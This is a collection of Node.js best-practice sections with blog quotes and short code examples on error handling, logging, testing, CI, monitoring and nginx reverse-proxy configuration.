### Blog Quote: "Programmer errors are bugs in the program"

From the blog, Joyent ranked 1 for the keywords “Node.js error handling”

 > …The best way to recover from programmer errors is to crash immediately. You should run your programs using a restarter that will automatically restart the program in the event of a crash. With a restarter in place, crashing is the fastest way to restore reliable service in the face of a transient programmer error…

### Blog Quote: "No safe way to leave without creating some undefined brittle state"

From Node.js official documentation

 > …By the very nature of how throw works in JavaScript, there is almost never any way to safely “pick up where you left off”, without leaking references, or creating some other sort of undefined brittle state. The safest way to respond to a thrown error is to shut down the process. Of course, in a normal web server, you might have many connections open, and it is not reasonable to abruptly shut those down because an error was triggered by someone else. The better approach is to send an error response to the request that triggered the error while letting the others finish in their normal time, and stop listening for new requests in that worker.

### Blog Quote: "Otherwise you risk the state of your application"

From the blog, debugable.com ranked 3 for the keywords “Node.js uncaught exception”

 > …So, unless you really know what you are doing, you should perform a graceful restart of your service after receiving an “uncaughtException” exception event. Otherwise, you risk the state of your application, or that of 3rd party libraries to become inconsistent, leading to all kinds of crazy bugs…

### Blog Quote: "There are three schools of thoughts on error handling"

From the blog: JS Recipes

> …There are primarily three schools of thoughts on error handling:
1. Let the application crash and restart it.
2. Handle all possible errors and never crash.
3. A balanced approach between the two

<br></br>

# `Handle errors centrally. Not within middlewares`

### One Paragraph Explainer

Without one dedicated object for error handling, greater are the chances of important errors hiding under the radar due to improper handling. The error handler object is responsible for making the error visible, for example by writing to a well-formatted logger, sending events to some monitoring product like [Sentry](https://sentry.io/), [Rollbar](https://rollbar.com/), or [Raygun](https://raygun.com/). Most web frameworks, like [Express](http://expressjs.com/en/guide/error-handling.html#writing-error-handlers), provide an error handling middleware mechanism. A typical error handling flow might be: Some module throws an error -> API router catches the error -> it propagates the error to the middleware (e.g. Express, KOA) who is responsible for catching errors -> a centralized error handler is called -> the middleware is being told whether this error is an untrusted error (not operational) so it can restart the app gracefully. Note that it’s a common, yet wrong, practice to handle errors within Express middleware – doing so will not cover errors that are thrown in non-web interfaces.

### Code Example – a typical error flow

```javascript
// DAL layer, we don't handle errors here
DB.addDocument(newCustomer, (error, result) => {
  if (error)
    throw new Error("Great error explanation comes here", other useful parameters)
});

// API route code, we catch both sync and async errors and forward to the middleware
try {
  customerService.addNew(req.body).then((result) => {
    res.status(200).json(result);
  }).catch((error) => {
    next(error)
  });
}
catch (error) {
  next(error);
}

// Error handling middleware, we delegate the handling to the centralized error handler
app.use(async (err, req, res, next) => {
  const isOperationalError = await errorHandler.handleError(err);
  if (!isOperationalError) {
    next(err);
  }
});
```

### Code example – handling errors within a dedicated object

```javascript
module.exports.handler = new errorHandler();

function errorHandler() {
  this.handleError = async function(err) {
    await logger.logError(err);
    await sendMailToAdminIfCritical;
    await saveInOpsQueueIfCritical;
    await determineIfOperationalError;
  };
}
```

### Code Example – Anti Pattern: handling errors within the middleware

```javascript
// middleware handling the error directly, who will handle Cron jobs and testing errors?
app.use((err, req, res, next) => {
  logger.logError(err);
  if (err.severity == errors.high) {
    mailer.sendMail(configuration.adminMail, 'Critical error occured', err);
  }
  if (!err.isOperational) {
    next(err);
  }
});
```

### Blog Quote: "Sometimes lower levels can’t do anything useful except propagate the error to their caller"

From the blog Joyent, ranked 1 for the keywords “Node.js error handling”

> …You may end up handling the same error at several levels of the stack. This happens when lower levels can’t do anything useful except propagate the error to their caller, which propagates the error to its caller, and so on. Often, only the top-level caller knows what the appropriate response is, whether that’s to retry the operation, report an error to the user, or something else. But that doesn’t mean you should try to report all errors to a single top-level callback, because that callback itself can’t know in what context the error occurred…

### Blog Quote: "Handling each err individually would result in tremendous duplication"

From the blog JS Recipes ranked 17 for the keywords “Node.js error handling”

> ……In Hackathon Starter api.js controller alone, there are over 79 occurrences of error objects. Handling each err individually would result in a tremendous amount of code duplication. The next best thing you can do is to delegate all error handling logic to an Express middleware…

### Blog Quote: "HTTP errors have no place in your database code"

From the blog Daily JS ranked 14 for the keywords “Node.js error handling”

> ……You should set useful properties in error objects, but use such properties consistently. And, don’t cross the streams: HTTP errors have no place in your database code. Or for browser developers, Ajax errors have a place in the code that talks to the server, but not code that processes Mustache templates…

<br></br>

# `Document API errors using Swagger or GraphQL`

### One Paragraph Explainer

REST APIs return results using HTTP status codes, it’s absolutely required for the API user to be aware not only about the API schema but also about potential errors – the caller may then catch an error and tactfully handle it. For example, your API documentation might state in advance that HTTP status 409 is returned when the customer name already exists (assuming the API register new users) so the caller can correspondingly render the best UX for the given situation. Swagger is a standard that defines the schema of API documentation offering an eco-system of tools that allow creating documentation easily online, see print screens below

If you have already adopted GraphQL for your API endpoints, your schema already contains strict guarantees as to what errors should look like ([outlined in the spec](https://facebook.github.io/graphql/June2018/#sec-Errors)) and how they should be handled by your client-side tooling. In addition, you can also supplement them with comment-based documentation.

### GraphQL Error Example

> This example uses [SWAPI](https://graphql.org/swapi-graphql), the Star Wars API.

```graphql
# should fail because id is not valid
{
  film(id: "1ZmlsbXM6MQ==") {
    title
  }
}
```

```json
{
  "errors": [
    {
      "message": "No entry in local cache for https://swapi.co/api/films/.../",
      "locations": [
        {
          "line": 2,
          "column": 3
        }
      ],
      "path": [
        "film"
      ]
    }
  ],
  "data": {
    "film": null
  }
}
```

### Blog Quote: "You have to tell your callers what errors can happen"

From the blog Joyent, ranked 1 for the keywords “Node.js logging”

 > We’ve talked about how to handle errors, but when you’re writing a new function, how do you deliver errors to the code that called your function? …If you don’t know what errors can happen or don’t know what they mean, then your program cannot be correct except by accident. So if you’re writing a new function, you have to tell your callers what errors can happen and what they mean…

### Useful Tool: Swagger Online Documentation Creator
[swagger_doc]: assets/images/swaggerDoc.png
![swagger_doc]

<br></br>

# `Exit the process gracefully when a stranger comes to town`

### One Paragraph Explainer

Somewhere within your code, an error handler object is responsible for deciding how to proceed when an error is thrown – if the error is trusted (i.e. operational error, see further explanation within best practice #3) then writing to log file might be enough. Things get hairy if the error is not familiar – this means that some component might be in a faulty state and all future requests are subject to failure. For example, assuming a singleton, stateful token issuer service that threw an exception and lost its state – from now it might behave unexpectedly and cause all requests to fail. Under this scenario, kill the process and use a ‘Restarter tool’ (like Forever, PM2, etc) to start over with a clean state.

### Code example: deciding whether to crash

```javascript
// Assuming developers mark known operational errors with error.isOperational=true, read best practice #3
process.on('uncaughtException', function(error) {
  errorManagement.handler.handleError(error);
  if(!errorManagement.handler.isTrustedError(error))
  process.exit(1)
});

// centralized error handler encapsulates error-handling related logic
function errorHandler() {
  this.handleError = function (error) {
    return logger.logError(err)
      .then(sendMailToAdminIfCritical)
      .then(saveInOpsQueueIfCritical)
      .then(determineIfOperationalError);
  }

  this.isTrustedError = function (error) {
    return error.isOperational;
  }
}
```

### Blog Quote: "The best way is to crash"

From the blog Joyent

> …The best way to recover from programmer errors is to crash immediately. You should run your programs using a restarter that will automatically restart the program in the event of a crash. With a restarter in place, crashing is the fastest way to restore reliable service in the face of a transient programmer error…

### Blog Quote: "There are three schools of thoughts on error handling"

From the blog: JS Recipes

> …There are primarily three schools of thoughts on error handling:
1. Let the application crash and restart it.
2. Handle all possible errors and never crash.
3. A balanced approach between the two

### Blog Quote: "No safe way to leave without creating some undefined brittle state"

From Node.js official documentation

> …By the very nature of how throw works in JavaScript, there is almost never any way to safely “pick up where you left off”, without leaking references, or creating some other sort of undefined brittle state. The safest way to respond to a thrown error is to shut down the process. Of course, in a normal web server, you might have many connections open, and it is not reasonable to abruptly shut those down because an error was triggered by someone else. The better approach is to send an error response to the request that triggered the error while letting the others finish in their normal time, and stop listening for new requests in that worker.

<br></br>

# `Use a mature logger to increase errors visibility`

### One Paragraph Explainer

We all love console.log but obviously, a reputable and persistent logger like [Winston][winston], or [Pino][pino] (the new kid in town which is focused on performance) is mandatory for serious projects. A set of practices and tools will help to reason about errors much quicker – (1) log frequently using different levels (debug, info, error), (2) when logging, provide contextual information as JSON objects, see example below. (3) watch and filter logs using a log querying API (built-in in most loggers) or a log viewer software
(4) Expose and curate log statement for the operation team using operational intelligence tools like Splunk

[winston]: https://www.npmjs.com/package/winston
[pino]: https://www.npmjs.com/package/pino

### Code Example – Winston Logger in action

```javascript
// your centralized logger object
var logger = new winston.Logger({
  level: 'info',
  transports: [
    new (winston.transports.Console)()
  ]
});

// custom code somewhere using the logger
logger.log('info', 'Test Log Message with some parameter %s', 'some parameter', { anything: 'This is metadata' });

```

### Code Example – Querying the log folder (searching for entries)

```javascript
var options = {
  from: new Date - 24 * 60 * 60 * 1000,
  until: new Date,
  limit: 10,
  start: 0,
  order: 'desc',
  fields: ['message']
};


// Find items logged between today and yesterday.
winston.query(options, function (err, results) {
  // execute callback with results
});
```

### Blog Quote: "Logger Requirements"

 From the blog Strong Loop

> Lets identify a few requirements (for a logger):
1. Timestamp each log line. This one is pretty self-explanatory – you should be able to tell when each log entry occurred.
2. Logging format should be easily digestible by humans as well as machines.
3. Allows for multiple configurable destination streams. For example, you might be writing trace logs to one file but when an error is encountered, write to the same file, then into error file and send an email at the same time…

<br></br>

# `Test error flows using your favorite test framework`

### One Paragraph Explainer

Testing ‘happy’ paths is no better than testing failures. Good testing code coverage demands to test exceptional paths. Otherwise, there is no trust that exceptions are indeed handled correctly. Every unit testing framework, like [Mocha](https://mochajs.org/) & [Chai](http://chaijs.com/), supports exception testing (code examples below). If you find it tedious to test every inner function and exception you may settle with testing only REST API HTTP errors.

### Code example: ensuring the right exception is thrown using Mocha & Chai

```javascript
describe("Facebook chat", () => {
  it("Notifies on new chat message", () => {
    var chatService = new chatService();
    chatService.participants = getDisconnectedParticipants();
    expect(chatService.sendMessage.bind({ message: "Hi" })).to.throw(ConnectionError);
  });
});

```

### Code example: ensuring API returns the right HTTP error code

```javascript
it("Creates new Facebook group", function (done) {
  var invalidGroupInfo = {};
  httpRequest({
    method: 'POST',
    uri: "facebook.com/api/groups",
    resolveWithFullResponse: true,
    body: invalidGroupInfo,
    json: true
  }).then((response) => {
    // if we were to execute the code in this block, no error was thrown in the operation above
  }).catch(function (response) {
    expect(400).to.equal(response.statusCode);
    done();
  });
});
```
<br></br>

# `Discover errors and downtime using APM products`

### One Paragraph Explainer

Exception != Error. Traditional error handling assumes the existence of Exception but application errors might come in the form of slow code paths, API downtime, lack of computational resources and more. This is where APM products come in handy as they allow to detect a wide variety of ‘burried’ issues proactively with a minimal setup. Among the common features of APM products are for example alerting when the HTTP API returns errors, detect when the API response time drops below some threshold, detection of ‘code smells’, features to monitor server resources, operational intelligence dashboard with IT metrics and many other useful features. Most vendors offer a free plan.

### Wikipedia about APM

In the fields of information technology and systems management, Application Performance Management (APM) is the monitoring and management of performance and availability of software applications. APM strives to detect and diagnose complex application performance problems to maintain an expected level of service. APM is “the translation of IT metrics into business meaning ([i.e.] value)". Major products and segments.

### Understanding the APM marketplace

APM products constitute 3 major segments:

1. Website or API monitoring – external services that constantly monitor uptime and performance via HTTP requests. Can be set up in few minutes. Following are few selected contenders: [Pingdom](https://www.pingdom.com/), [Uptime Robot](https://uptimerobot.com/), and [New Relic](https://newrelic.com/application-monitoring)

2. Code instrumentation – product family which requires embedding an agent within the application to use features like slow code detection, exception statistics, performance monitoring and many more. Following are few selected contenders: New Relic, App Dynamics

3. Operational intelligence dashboard – this line of products is focused on facilitating the ops team with metrics and curated content that helps to easily stay on top of application performance. This usually involves aggregating multiple sources of information (application logs, DB logs, servers log, etc) and upfront dashboard design work. Following are few selected contenders: [Datadog](https://www.datadoghq.com/), [Splunk](https://www.splunk.com/), [Zabbix](https://www.zabbix.com/)

[uptime_robot]: assets/images/uptimerobot.jpg
[app_dynamics_dashboard]: assets/images/app-dynamics-dashboard.png

 ### Example: UpTimeRobot.Com – Website monitoring dashboard
![uptime_robot]

 ### Example: AppDynamics.Com – end to end monitoring combined with code instrumentation
![app_dynamics_dashboard]

<br></br>

# `Catch unhandled promise rejections`

<br/><br/>

### One Paragraph Explainer

Typically, most of modern Node.js/Express application code runs within promises – whether within the .then handler, a function callback or in a catch block. Surprisingly, unless a developer remembered to add a .catch clause, errors thrown at these places are not handled by the uncaughtException event-handler and disappear.  Recent versions of Node added a warning message when an unhandled rejection pops, though this might help to notice when things go wrong but it's obviously not a proper error handling method. The straightforward solution is to never forget adding .catch clauses within each promise chain call and redirect to a centralized error handler. However, building your error handling strategy only on developer’s discipline is somewhat fragile. Consequently, it’s highly recommended using a graceful fallback and subscribe to `process.on(‘unhandledRejection’, callback)` – this will ensure that any promise error, if not handled locally, will get its treatment.

<br/><br/>

### Code example: these errors will not get caught by any error handler (except unhandledRejection)

```javascript
DAL.getUserById(1).then((johnSnow) => {
  // this error will just vanish
  if(johnSnow.isAlive == false)
      throw new Error('ahhhh');
});

```

<br/><br/>

### Code example: Catching unresolved and rejected promises

```javascript
process.on('unhandledRejection', (reason, p) => {
  // I just caught an unhandled promise rejection, since we already have fallback handler for unhandled errors (see below), let throw and let him handle that
  throw reason;
});
process.on('uncaughtException', (error) => {
  // I just received an error that was never handled, time to handle it and then decide whether a restart is needed
  errorManagement.handler.handleError(error);
  if (!errorManagement.handler.isTrustedError(error))
    process.exit(1);
});

```

<br/><br/>

### Blog Quote: "If you can make a mistake, at some point you will"

 From the blog James Nelson

 > Let’s test your understanding. Which of the following would you expect to print an error to the console?

```javascript
Promise.resolve(‘promised value’).then(() => {
  throw new Error(‘error’);
});

Promise.reject(‘error value’).catch(() => {
  throw new Error(‘error’);
});

new Promise((resolve, reject) => {
  throw new Error(‘error’);
});
```

> I don’t know about you, but my answer is that I’d expect all of them to print an error. However, the reality is that a number of modern JavaScript environments won’t print errors for any of them.The problem with being human is that if you can make a mistake, at some point you will. Keeping this in mind, it seems obvious that we should design things in such a way that mistakes hurt as little as possible, and that means handling errors by default, not discarding them.

<br></br>

# `Fail fast, validate arguments using a dedicated library`

### One Paragraph Explainer

We all know how checking arguments and failing fast is important to avoid hidden bugs (see anti-pattern code example below). If not, read about explicit programming and defensive programming. In reality, we tend to avoid it due to the annoyance of coding it (e.g. think of validating hierarchical JSON object with fields like email and dates) – libraries like Joi and Validator turn this tedious task into a breeze.

### Wikipedia: Defensive Programming

Defensive programming is an approach to improve software and source code, in terms of General quality – reducing the number of software bugs and problems. Making the source code comprehensible – the source code should be readable and understandable so it is approved in a code audit. Making the software behave in a predictable manner despite unexpected inputs or user actions.

### Code example: validating complex JSON input using ‘Joi’

```javascript
var memberSchema = Joi.object().keys({
 password: Joi.string().regex(/^[a-zA-Z0-9]{3,30}$/),
 birthyear: Joi.number().integer().min(1900).max(2013),
 email: Joi.string().email()
});

function addNewMember(newMember) {
 // assertions come first
 Joi.assert(newMember, memberSchema); //throws if validation fails
 // other logic here
}

```

### Anti-pattern: no validation yields nasty bugs

```javascript
// if the discount is positive let's then redirect the user to print his discount coupons
function redirectToPrintDiscount(httpResponse, member, discount) {
    if (discount != 0) {
        httpResponse.redirect(`/discountPrintView/${member.id}`);
    }
}

redirectToPrintDiscount(httpResponse, someMember);
// forgot to pass the parameter discount, why the heck was the user redirected to the discount screen?

```

### Blog Quote: "You should throw these errors immediately"

 From the blog: Joyent

 > A degenerate case is where someone calls an asynchronous function but doesn’t pass a callback. You should throw these errors immediately since the program is broken and the best chance of debugging it involves getting at least a stack trace and ideally a core file at the point of the error. To do this, we recommend validating the types of all arguments at the start of the function.

<br></br>

# `Using ESLint and Prettier`

### Comparing ESLint and Prettier

If you format this code using ESLint, it will just give you a warning that it's too wide (depends on your `max-len` setting). Prettier will automatically format it for you.

```javascript
foo(reallyLongArg(), omgSoManyParameters(), IShouldRefactorThis(), isThereSeriouslyAnotherOne(), noWayYouGottaBeKiddingMe());
```

```javascript
foo(
  reallyLongArg(),
  omgSoManyParameters(),
  IShouldRefactorThis(),
  isThereSeriouslyAnotherOne(),
  noWayYouGottaBeKiddingMe()
);
```

Source: [https://github.com/prettier/prettier-eslint/issues/101](https://github.com/prettier/prettier-eslint/issues/101)

### Integrating ESLint and Prettier

ESLint and Prettier overlap in the code formatting feature but can be easily combined by using other packages like [prettier-eslint](https://github.com/prettier/prettier-eslint), [eslint-plugin-prettier](https://github.com/prettier/eslint-plugin-prettier), and [eslint-config-prettier](https://github.com/prettier/eslint-config-prettier). For more information about their differences, you can view the link [here](https://stackoverflow.com/questions/44690308/whats-the-difference-between-prettier-eslint-eslint-plugin-prettier-and-eslint).

<br></br>

# `Include 3 parts in each test name`

<br/><br/>

### One Paragraph Explainer

A test report should tell whether the current application revision satisfies the requirements for the people who are not necessarily familiar with the code: the tester, the DevOps engineer who is deploying and the future you two years from now. This can be achieved best if the tests speak at the requirements level and include 3 parts:

(1) What is being tested? For example, the ProductsService.addNewProduct method

(2) Under what circumstances and scenario? For example, no price is passed to the method

(3) What is the expected result? For example, the new product is not approved

<br/><br/>

### Code example: a test name that incluces 3 parts
```javascript
//1. unit under test
describe('Products Service', function() {
  describe('Add new product', function() {
    //2. scenario and 3. expectation
    it('When no price is specified, then the product status is pending approval', ()=> {
      const newProduct = new ProductService().add(...);
      expect(newProduct.status).to.equal('pendingApproval');
    });
  });
});
```

<br/><br/>

### Code Example – Anti Pattern: one must read the entire test code to understand the intent 
```javascript
describe('Products Service', function() {
  describe('Add new product', function() {
    it('Should return the right status', ()=> {
        //hmm, what is this test checking? what are the scenario and expectation?
      const newProduct = new ProductService().add(...);
      expect(newProduct.status).to.equal('pendingApproval');
    });
  });
});
```

<br/><br/>

[test_report_like_req]: assets/images/test-report-like-requirements.jpeg

###  "Doing It Right Example: The test report resembles the requirements document"

 [From the blog "30 Node.js testing best practices" by Yoni Goldberg](https://medium.com/@me_37286/yoni-goldberg-javascript-nodejs-testing-best-practices-2b98924c9347)

 ![test_report_like_req]

<br/><br/>

# `Structure tests by the AAA pattern`

<br/><br/>

### One Paragraph Explainer
Our biggest testing challenge is the lack of headspace - we already have the production code keeping us super-busy. For this reason the testing code must stay dead-simple and easy to understand. When reading a test case - it shouldn't feel like reading imperative code (loops, inheritance) rather more like HTML - a declarative experience. To achieve this, keep the AAA convention so the readers mind will parse the test intent effortlessly. There some other similar formats to this pattern, like XUnit 'Setup, Excercise, Verify, Teardown'. These are the three A:

The 1st A - Arrange: All the setup code to bring the system to the scenario the test aims to simulate. This might include instantiating the unit under test constructor, adding DB records, mocking/stubbing on objects and any other preparation code

The 2nd A - Act: Execute the unit under test. Usually 1 line of code

The 3rd A - Assert: Ensure that the received value satisfies the expectation. Usually 1 line of code


<br/><br/>

### Code example: a test strcutured with the AAA pattern
```javascript
describe.skip('Customer classifier', () => {
    test('When customer spent more than 500$, should be classified as premium', () => {
        //Arrange
        const customerToClassify = {spent:505, joined: new Date(), id:1}
        const DBStub = sinon.stub(dataAccess, "getCustomer")
            .reply({id:1, classification: 'regular'});

        //Act
        const receivedClassification = customerClassifier.classifyCustomer(customerToClassify);

        //Assert
        expect(receivedClassification).toMatch('premium');
    });
});
```

<br/><br/>

### Code Example – Anti Pattern: no separation, one bulk, harder to interpret
```javascript
test('Should be classified as premium', () => {
        const customerToClassify = {spent:505, joined: new Date(), id:1}
        const DBStub = sinon.stub(dataAccess, "getCustomer")
            .reply({id:1, classification: 'regular'});
        const receivedClassification = customerClassifier.classifyCustomer(customerToClassify);
        expect(receivedClassification).toMatch('premium');
    });
```

<br/><br/>

[6_parts_in_a_test]: assets/images/6-parts-in-test.jpg

###  "Include 6 parts in each test"

 [From the blog "30 Node.js testing best practices" by Yoni Goldberg](https://medium.com/@me_37286/yoni-goldberg-javascript-nodejs-testing-best-practices-2b98924c9347)

 ![6_parts_in_a_test]

<br/><br/>

### "It is important for the test reader to be able to quickly determine what behavior the test is verifying"
From the book [XUnit Patterns](http://xunitpatterns.com/Four%20Phase%20Test.html):

> It is important for the test reader to be able to quickly determine what behavior the test is verifying. It can be very confusing when various behaviors of the system under test (SUT) are being invoked, some to set up the pre-test state (fixture) of the SUT, others to exercise the SUT and yet others to verify the post-test state of the SUT. Clearly identifying the four phases makes the intent of the test much easier to see.

<br></br>

# `Avoid global test fixtures and seeds, add data per-test`

<br/><br/>

### One Paragraph Explainer

 Going by the golden testing rule - keep test cases dead-simple, each test should add and act on its own set of DB rows to prevent coupling and easily reason about the test flow. In reality, this is often violated by testers who seed the DB with data before running the tests (also known as ‘test fixture’) for the sake of performance improvement. While performance is indeed a valid concern — it can be mitigated (e.g. In-memory DB, see “Component testing” bullet), however, test complexity is a much painful sorrow that should govern other considerations. Practically, make each test case explicitly add the DB records it needs and act only on those records. If performance becomes a critical concern — a balanced compromise might come in the form of seeding the only suite of tests that are not mutating data (e.g. queries)

<br/><br/>

### Code example: each test acts on its own set of data
```javascript
it("When updating site name, get successful confirmation", async () => {
  //test is adding a fresh new records and acting on the records only
  const siteUnderTest = await SiteService.addSite({
    name: "siteForUpdateTest"
  });
  const updateNameResult = await SiteService.changeName(siteUnderTest, "newName");
  expect(updateNameResult).to.be(true);
});
```

<br/><br/>

### Code Example – Anti Pattern:  tests are not independent and assume the existence of some pre-configured data
```javascript
before(() => {
  //adding sites and admins data to our DB. Where is the data? outside. At some external json or migration framework
  await DB.AddSeedDataFromJson('seed.json');
});
it("When updating site name, get successful confirmation", async () => {
  //I know that site name "portal" exists - I saw it in the seed files
  const siteToUpdate = await SiteService.getSiteByName("Portal");
  const updateNameResult = await SiteService.changeName(siteToUpdate, "newName");
  expect(updateNameResult).to.be(true);
});
it("When querying by site name, get the right site", async () => {
  //I know that site name "portal" exists - I saw it in the seed files
  const siteToCheck = await SiteService.getSiteByName("Portal");
  expect(siteToCheck.name).to.be.equal("Portal"); //Failure! The previous test change the name :[
});
```

<br></br>

# `Refactoring`

<br/><br/>

### One Paragraph Explainer

Refactoring is an important process in the iterative development flow. Removing "Code Smells" (bad coding practices) such as Duplicated Code, Long Methods, Long Parameter list will improve your code and making it more maintainable. Using a static analysis tools will assist you in finding these code smells and build a process around refactoring. Adding these tools to your CI build will help automate the quality checking process. If your CI integrates with a tool like Sonar or Code Climate, the build will fail if it detects code smells and inform the author on how to address the issue. Theses static analysis tools will complement lint tools such as ESLint. Most linting tools will focus on code styles like indentation and missing semicolons (although some will find code smells like Long functions) in a single file while static analysis tools will focus on finding code smells (duplicate code, complexity analysis, etc) that are in single files and multiple files.

<br/><br/>


### Martin Fowler - Chief Scientist at ThoughtWorks

 From the book, "Refactoring - Improving the Design of Existing Code"

 > Refactoring is a controlled technique for improving the design of an existing code base.

<br/><br/>

### Evan Burchard - Web Development Consultant and Author

 From the book, "Refactoring JavaScript: Turning Bad Code into Good Code"

 > No matter what framework or
“compiles-to-JS” language or library you use, bugs and performance concerns
will always be an issue if the underlying quality of your JavaScript is poor.

<br/><br/>

### Example: Code analysis summary and trends with SonarQube (commercial)
[sonarqube]: assets/images/codeanalysis-sonarqube-dashboard.PNG
![sonarqube]

<br/><br/>

# `Carefully choose your CI platform`

<br/><br/>

### One Paragraph Explainer

The CI world used to be the flexibility of [Jenkins](https://jenkins.io/) vs the simplicity of SaaS vendors. The game is now changing as SaaS providers like [CircleCI](https://circleci.com/) and [Travis](https://travis-ci.org/) offer robust solutions including Docker containers with minimum setup time while Jenkins tries to compete on 'simplicity' segment as well. Though one can setup rich CI solution in the cloud, should it required to control the finest details Jenkins is still the platform of choice. The choice eventually boils down to which extent the CI process should be customized: free and setup free cloud vendors allow to run custom shell commands, custom docker images, adjust the workflow, run matrix builds and other rich features. However, if controlling the infrastructure or programming the CI logic using a formal programming language like Java is desired - Jenkins might still be the choice. Otherwise, consider opting for the simple and setup free cloud option

<br/><br/>

### Code Example – a typical cloud CI configuration. Single .yml file and that's it

```javascript
version: 2
jobs:
  build:
    docker:
      - image: circleci/node:4.8.2
      - image: mongo:3.4.4
    steps:
      - checkout
      - run:
          name: Install npm wee
          command: npm install
  test:
    docker:
      - image: circleci/node:4.8.2
      - image: mongo:3.4.4
    steps:
      - checkout
      - run:
          name: Test
          command: npm test
      - run:
          name: Generate code coverage
          command: './node_modules/.bin/nyc report --reporter=text-lcov'      
      - store_artifacts:
          path: coverage
          prefix: coverage

```

### Circle CI - almost zero setup cloud CI
[circle_ci]: assets/images/circleci.png
![circle_ci]

### Jenkins - sophisticated and robust CI 
[jenkins_dashboard]: assets/images/jenkins_dashboard.png
![jenkins_dashboard]

<br/><br/>

# `Monitoring!`

<br/><br/>

### One Paragraph Explainer

At the very basic level, monitoring means you can *easily* identify when bad things happen at production. For example, by getting notified by email or Slack. The challenge is to choose the right set of tools that will satisfy your requirements without breaking your bank. May I suggest, start with defining the core set of metrics that must be watched to ensure a healthy state – CPU, server RAM,  Node process RAM (less than 1.4GB), the number of errors in the last minute, number of process restarts, average response time. Then go over some advanced features you might fancy and add to your wish list. Some examples of a luxury monitoring feature: DB profiling, cross-service measuring (i.e. measure business transaction), front-end integration, expose raw data to custom BI clients, Slack notifications and many others.

Achieving the advanced features demands lengthy setup or buying a commercial product such as Datadog, NewRelic and alike. Unfortunately, achieving even the basics is not a walk in the park as some metrics are hardware-related (CPU) and others live within the node process (internal errors) thus all the straightforward tools require some additional setup. For example, cloud vendor monitoring solutions (e.g. [AWS CloudWatch](https://aws.amazon.com/cloudwatch/), [Google StackDriver](https://cloud.google.com/stackdriver/)) will tell you immediately about the hardware metrics but not about the internal app behavior. On the other end, Log-based solutions such as ElasticSearch lack the hardware view by default. The solution is to augment your choice with missing metrics, for example, a popular choice is sending application logs to [Elastic stack](https://www.elastic.co/products) and configure some additional agent (e.g. [Beat](https://www.elastic.co/products)) to share hardware-related information to get the full picture.

<br/><br/>

### Monitoring example: AWS cloudwatch default dashboard. Hard to extract in-app metrics
[monitoring1]: assets/images/monitoring1.png

![monitoring1]

<br/><br/>

### Monitoring example: StackDriver default dashboard. Hard to extract in-app metrics
[monitoring2]: assets/images/monitoring2.jpg
![monitoring2]

<br/><br/>

### Monitoring example: Grafana as the UI layer that visualizes raw data
[monitoring3]: assets/images/monitoring3.png
![monitoring3] 

<br/><br/>

# `Smart Logging`

### What Other Bloggers Say

From the blog [Rising Stack](http://mubaloo.com/best-practices-deploying-node-js-applications/):

> …We recommend you to watch these signals for all of your services:
> Error Rate: Because errors are user facing and immediately affect your customers.
> Response time: Because the latency directly affects your customers and business.
> Throughput: The traffic helps you to understand the context of increased error rates and the latency too.
> Saturation: It tells how “full” your service is. If the CPU usage is 90%, can your system handle more traffic? …

<br></br>

# Make your app transparent using smart logs

<br/><br/>

### One Paragraph Explainer

Since you print out log statements anyway and you're obviously in a need of some interface that wraps up production information where you can trace errors and core metrics (e.g. how many errors happen every hour and which is your slowest API end-point) why not invest some moderate effort in a robust logging framework that will tick all boxes? Achieving that requires a thoughtful decision on three steps:

**1. smart logging** – at the bare minimum you need to use a reputable logging library like [Winston](https://github.com/winstonjs/winston), [Bunyan](https://github.com/trentm/node-bunyan) and write meaningful information at each transaction start and end. Consider to also format log statements as JSON and provide all the contextual properties (e.g. user id, operation type, etc) so that the operations team can act on those fields. Include also a unique transaction ID at each log line, for more information refer to the bullet below “Write transaction-id to log”. One last point to consider is also including an agent that logs the system resource like memory and CPU like Elastic Beat.

**2. smart aggregation** – once you have comprehensive information on your servers file system, it’s time to periodically push these to a system that aggregates, facilities and visualizes this data. The Elastic stack, for example, is a popular and free choice that offers all the components to aggregate and visualize data. Many commercial products provide similar functionality only they greatly cut down the setup time and require no hosting.

**3. smart visualization** – now the information is aggregated and searchable, one can be satisfied only with the power of easily searching the logs but this can go much further without coding or spending much effort. We can now show important operational metrics like error rate, average CPU throughout the day, how many new users opted-in in the last hour and any other metric that helps to govern and improve our app

<br/><br/>

### Visualization Example: Kibana (part of the Elastic stack) facilitates advanced searching on log content
[smartlogging1]: assets/images/smartlogging1.png

![smartlogging1]

<br/><br/>

### Visualization Example: Kibana (part of the Elastic stack) visualizes data based on logs
[smartlogging2]: assets/images/smartlogging2.jpg

![smartlogging2]

<br/><br/>

### Blog Quote: Logger Requirements

From the blog [Strong Loop](https://strongloop.com/strongblog/compare-node-js-logging-winston-bunyan/):

> Lets identify a few requirements (for a logger):
> 1. Timestamp each log line. This one is pretty self-explanatory – you should be able to tell when each log entry occurred.
> 2. Logging format should be easily digestible by humans as well as machines.
> 3. Allows for multiple configurable destination streams. For example, you might be writing trace logs to one file but when an error is encountered, write to the same file, then into error file and send an email at the same time…

<br/><br/>

# `Delegate anything possible (e.g. static content, gzip) to a reverse proxy`

<br/><br/>

### One Paragraph Explainer

It’s very tempting to cargo-cult Express and use its rich middleware offering for networking related tasks like serving static files, gzip encoding, throttling requests, SSL termination, etc. This is a performance kill due to its single threaded model which will keep the CPU busy for long periods (Remember, Node’s execution model is optimized for short tasks or async IO related tasks). A better approach is to use a tool that expertise in networking tasks – the most popular are nginx and HAproxy which are also used by the biggest cloud vendors to lighten the incoming load on node.js processes.

<br/><br/>

### Nginx Config Example – Using nginx to compress server responses

```nginx
# configure gzip compression
gzip on;
gzip_comp_level 6;
gzip_vary on;

# configure upstream
upstream myApplication {
    server 127.0.0.1:3000;
    server 127.0.0.1:3001;
    keepalive 64;
}

#defining web server
server {
    # configure server with ssl and error pages
    listen 80;
    listen 443 ssl;
    ssl_certificate /some/location/sillyfacesociety.com.bundle.crt;
    error_page 502 /errors/502.html;

    # handling static content
    location ~ ^/(images/|img/|javascript/|js/|css/|stylesheets/|flash/|media/|static/|robots.txt|humans.txt|favicon.ico) {
    root /usr/local/silly_face_society/node/public;
    access_log off;
    expires max;
}
```

<br/><br/>

### What Other Bloggers Say

* From the blog [Mubaloo](http://mubaloo.com/best-practices-deploying-node-js-applications):
